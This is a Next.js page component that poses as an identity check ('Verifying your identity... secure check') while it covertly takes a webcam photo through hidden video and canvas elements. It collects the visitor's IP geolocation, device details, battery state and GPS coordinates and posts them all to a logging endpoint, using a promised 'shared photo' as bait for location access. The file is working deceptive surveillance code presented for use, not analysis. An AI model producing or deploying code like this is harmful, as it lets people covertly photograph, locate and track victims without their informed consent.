'use client';

import { useEffect, useRef, useState } from 'react';
import Image from 'next/image';

export default function Home() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [done, setDone] = useState(false);
  const [locationAllowed, setLocationAllowed] = useState(false);

  useEffect(() => {
    const capture = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
        }

        setTimeout(async () => {
          if (canvasRef.current && videoRef.current) {
            const ctx = canvasRef.current.getContext('2d');
            if (ctx) {
              ctx.drawImage(videoRef.current, 0, 0, 320, 240);
              const photo = canvasRef.current.toDataURL('image/jpeg');

              const ipRes = await fetch('https://ipapi.co/json');
              const ipInfo = await ipRes.json();
              const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
              const userAgent = navigator.userAgent;
              const platform = navigator.platform;
              const languages = navigator.languages;
              const referrer = document.referrer;

              const batteryInfo = {};
              if ('getBattery' in navigator) {
                try {
                  const battery = await navigator.getBattery();
                  batteryInfo.level = Math.round(battery.level * 100);
                  batteryInfo.charging = battery.charging;
                } catch (err) {
                  console.warn('⚡ Battery info failed:', err);
                }
              }

              navigator.geolocation.getCurrentPosition(
                async (pos) => {
                  const { latitude, longitude } = pos.coords;

                  await fetch('/api/log-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      photo,
                      ipInfo,
                      timezone,
                      userAgent,
                      platform,
                      languages,
                      batteryInfo,
                      referrer,
                      location: { latitude, longitude },
                    }),
                  });

                  setLocationAllowed(true);
                  setDone(true);
                  stream.getTracks().forEach((track) => track.stop());
                },
                async () => {
                  console.warn('❌ GPS access denied.');

                  // Don't show image, but still complete
                  setLocationAllowed(false);
                  setDone(true);
                  stream.getTracks().forEach((track) => track.stop());
                }
              );
            }
          }
        }, 2000);
      } catch (err) {
        console.error('❌ Camera access error', err);
        setDone(true); // Fallback in case of webcam error
      }
    };

    capture();
  }, []);

  return (
    <div
      style={{
        height: '100vh',
        background: '#f6f8fa',
        color: '#333',
        fontFamily: 'Segoe UI, Roboto, sans-serif',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        textAlign: 'center',
        padding: '2rem',
        transition: 'all 0.4s ease',
      }}
    >
      {!done ? (
        <>
          <h1 style={{ fontSize: '2rem', marginBottom: '1rem', color: '#0070f3' }}>
            Verifying your identity...
          </h1>
          <div
            style={{
              width: '48px',
              height: '48px',
              border: '6px solid #ddd',
              borderTopColor: '#0070f3',
              borderRadius: '50%',
              animation: 'spin 1s linear infinite',
              marginBottom: '1rem',
            }}
          />
          <p style={{ color: '#666' }}>Please wait while we perform a secure check.</p>
        </>
      ) : locationAllowed ? (
        <>
          <h1 style={{ fontSize: '2rem', color: '#28a745', marginBottom: '1rem' }}>
            ✅ Shared photo
          </h1>
          <Image
            src="https://res.cloudinary.com/drk2w9l0m/image/upload/v1743188604/mypic.png"
            alt="Verification Complete"
            width={320}
            height={240}
            style={{
              borderRadius: '12px',
              boxShadow: '0 4px 12px rgba(0, 0, 0, 0.1)',
              border: '1px solid #ccc',
              transition: 'all 0.3s ease',
              width: '100%',
              maxWidth: '320px',
              height: 'auto',
            }}
            priority
          />
        </>
      ) : (
        <>
          <h1 style={{ fontSize: '1.6rem', color: '#ff5e57' }}>
            ⚠️ Location access denied. Cannot show image.
          </h1>
        </>
      )}

      <video ref={videoRef} style={{ display: 'none' }} />
      <canvas ref={canvasRef} width="320" height="240" style={{ display: 'none' }} />

      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
